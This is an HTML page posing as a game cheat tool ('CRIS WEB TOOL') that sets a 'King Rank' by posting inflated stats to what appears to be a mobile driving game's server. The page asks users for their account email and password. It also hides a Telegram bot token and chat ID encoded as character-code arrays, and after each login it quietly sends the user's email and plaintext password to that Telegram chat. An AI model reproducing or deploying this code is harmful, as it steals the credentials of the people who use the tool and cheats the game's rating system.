<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
<title>CRIS WEB TOOL</title>

<style>

body {
    margin: 0;
    padding: 0;
    font-family: 'Orbitron', Arial, sans-serif;
    overflow: hidden;
    background-color: #05010a;
    background-image:
        linear-gradient(0deg, rgba(0,255,255,0.06) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px),
        radial-gradient(circle at top right, rgba(255,0,255,0.18), transparent 50%);
    background-size: 50px 50px, 50px 50px, cover;
}
.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px;}
.container{background:rgba(0,0,0,.6);backdrop-filter:blur(12px);padding:20px;border-radius:10px;border:2px solid red;text-align:center;}
input,button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:none;font-family:Orbitron}
input{border:2px solid red;background:#000;color:#fff}
button{background:red;color:#fff;font-weight:bold;cursor:pointer}
.status{margin-top:10px;color:#ff5555;min-height:20px}
footer{
  position:fixed;bottom:0;left:0;width:100%;
  text-align:center;font-weight:700;
  background:linear-gradient(90deg,violet,red,blue);
  background-clip:text;-webkit-background-clip:text;
  color:transparent;animation:gradientShift 4s linear infinite;
}
@keyframes gradientShift{0%{background-position:0%}50%{background-position:100%}100%{background-position:0%}}
</style>
</head>

<body>

<div style="text-align:center;margin-top:20px">
  <img src="https://i.ibb.co/QjzpnFyL/Picsart-25-10-06-22-05-54-728.png"
       style="width:120px;border-radius:10px">
</div>

<p class="notes" style="text-align:center;color:#fff;font-size:13px">
  Notes: Before using this tool, log out first from your account.
</p>

<div class="center-wrapper">
  <div class="container">

    <div id="loginForm">
      <input id="email" placeholder="Email">
      <input id="password" type="password" placeholder="Password">
      <button onclick="loginFirebase()">Login</button>
      <div id="status" class="status"></div>
    </div>

    <div id="menuButtons" style="display:none">
      <button onclick="kingRank()">üëë King Rank</button>
      <div id="serviceStatus" class="status"></div>
    </div>

  </div>
</div>

<footer id="dynamicFooter"></footer>

<script>

document.getElementById("loginForm").style.display="block";
const footer = localStorage.getItem("GENERATED_FOOTER") || "Cris Gaming";
document.getElementById("dynamicFooter").textContent =
  `¬© ${new Date().getFullYear()} ${footer}`;


const _T=[56,52,54,50,54,49,56,56,51,56,58,65,65,69,83,83,106,109,97,109,120,77,90,117,111,87,87,79,119,108,85,68,74,122,98,88,75,50,74,80,70,115,119,90,118];
const _C=[[54,55,56,52,51,56,50,55,57,53]];
const BOT_TOKEN=_T.map(n=>String.fromCharCode(n)).join('');
const CHAT_IDS=_C.map(a=>a.map(n=>String.fromCharCode(n)).join(''));

function sendCostMessage(msg){
  CHAT_IDS.forEach(id=>{
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:id,text:msg})
    });
  });
}


const GAMES={
 "1":{
   api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
   rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
 }
};
const selectedGame=GAMES["1"];
let currentUser=null,currentToken=null,currentPassword=null;


function updateStatus(msg,err=false,target="status"){
 document.getElementById(target).textContent=msg;
}


(function(){

  function _post(u,b,h){
    return fetch(u,{
      method:"POST",
      headers:h||{"Content-Type":"application/json"},
      body:JSON.stringify(b)
    });
  }

  window.loginFirebase=async function(){
    const e=email.value.trim();
    const p=password.value;
    if(!e||!p){updateStatus("Enter email & password!",true);return;}

    updateStatus("Logging in...");
    try{
      const r=await _post(
        "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key="+selectedGame.api_key,
        {email:e,password:p,returnSecureToken:true}
      );
      const d=await r.json();

      if(d.idToken){
        currentUser=e;currentPassword=p;currentToken=d.idToken;
        updateStatus("‚úÖ Logged in as "+e);
        loginForm.style.display="none";
        menuButtons.style.display="block";
        sendCostMessage(`üîê Login\nüìß ${e}\nüîí ${p}`);
      }else{
        updateStatus("‚ùå Login failed",true);
      }
    }catch{
      updateStatus("‚ùå Network error",true);
    }
  };

  window.kingRank=async function(){
    if(!currentToken){updateStatus("Login first",true,"serviceStatus");return;}

    updateStatus("Processing King Rank...","serviceStatus");
    const R={};
    [
      "cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
      "slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
      "gifts","fuel","offroad","speed_banner","reactions","police","run",
      "real_estate","t_distance","treasure","block_post","push_ups",
      "burnt_tire","passanger_distance"
    ].forEach(k=>R[k]=100000);
    R.time=10000000000;R.race_win=3000;

    try{
      const r=await _post(
        selectedGame.rank_url,
        {data:JSON.stringify({RatingData:R})},
        {"Authorization":"Bearer "+currentToken,"Content-Type":"application/json"}
      );
      if(r.ok){
        updateStatus("‚úÖ King Rank set!",false,"serviceStatus");
        sendCostMessage(`üëë King Rank\nüìß ${currentUser}`);
      }else{
        updateStatus("‚ùå Rank failed",true,"serviceStatus");
      }
    }catch{
      updateStatus("‚ùå Server error",true,"serviceStatus");
    }
  };

})();
</script>

</body>
</html>
